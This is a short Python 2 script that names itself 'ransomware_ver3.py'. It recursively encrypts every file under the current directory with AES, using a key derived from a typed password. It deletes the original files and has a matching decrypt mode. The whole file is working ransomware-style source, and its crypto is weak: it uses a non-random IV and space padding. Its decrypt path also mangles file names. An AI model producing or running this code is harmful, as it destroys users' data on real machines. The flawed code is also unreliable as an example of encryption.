#!/usr/bin/python

from Crypto.Hash import SHA256
from Crypto.Cipher import AES
import os
import random
import sys
import pkg_resources


def encrypt(key, filename):
	chunksize = 64 * 1024
	outFile = os.path.join(os.path.dirname(filename),"Encrypted_"+os.path.basename(filename))
	filesize = str(os.path.getsize(filename)).zfill(16)
	IV = ''
	for i in range (16):
		IV += chr(random.randint(0, 0xFF))

	encryptor = AES.new(key, AES.MODE_CBC, IV)

	with open(filename, "rb") as inFile:
		with open(outFile, "wb") as outfile:
			outfile.write(filesize)
			outfile.write(IV)
			while True:
				chunk = inFile.read(chunksize)
				if len(chunk) == 0:
					break
				elif len(chunk) % 16 != 0:
					chunk += ' '*(16 - 	(len(chunk) % 16))

				outfile.write(encryptor.encrypt(chunk))


def decrypt(key, filename):
	outFile = str(os.path.join(os.path.dirname(filename),os.path.basename(filename[10:])))
	newfile = str(os.path.basename(filename[10:]))
	newfile2 = newfile[10:]
	chunksize =64 * 1024
	
	with open(filename, "rb") as inFile:
		filesize = inFile.read(16)
		IV = inFile.read(16)

		decryptor = AES.new(key, AES.MODE_CBC, IV)


		with open(newfile2, "wb") as outputfile:
			while True:
				chunk = inFile.read(chunksize)
				if len(chunk) == 0:
					break

				outputfile.write(decryptor.decrypt(chunk))

			outputfile.truncate(int(filesize))
			

def allfiles():
	Files = []
	for root, subfiles, files in os.walk(os.getcwd()):
		 for names in files:
			Files.append(os.path.join(root, names))
	return Files


choice = raw_input("Do you want to (E)ncrypt or (D)ecrypt ?: ")
password = raw_input("Enter the password: ")

encFiles = allfiles()
#print encFiles

for word in encFiles:
	if word.endswith("ransomware_ver3.py"):
		encFiles.remove(word)

'''
#print encFiles
j = 1
for i in encFiles:
	#print "File:",j, i
	j += 1
'''
if choice == "E":
	for Tfiles in encFiles:
		if os.path.basename(Tfiles).startswith("Encrypted_"):
			print "%s is already encrypted" %str(Tfiles)
			pass

		elif Tfiles == os.path.join(os.getcwd(), sys.argv[0]):
			pass
		else:
			encrypt(SHA256.new(password).digest(), str(Tfiles))
			print "Done encrypting %s" %str(Tfiles)
			os.remove(Tfiles)

if choice == "D":
	for Tfiles in encFiles:
		if not os.path.basename(Tfiles).startswith("Encrypted_"):
			print "%s is already not encrypted" %str(Tfiles)
			pass

		else:
			decrypt(SHA256.new(password).digest(), str(Tfiles))
			print "Done decrypting %s" %str(Tfiles)
			os.remove(Tfiles)


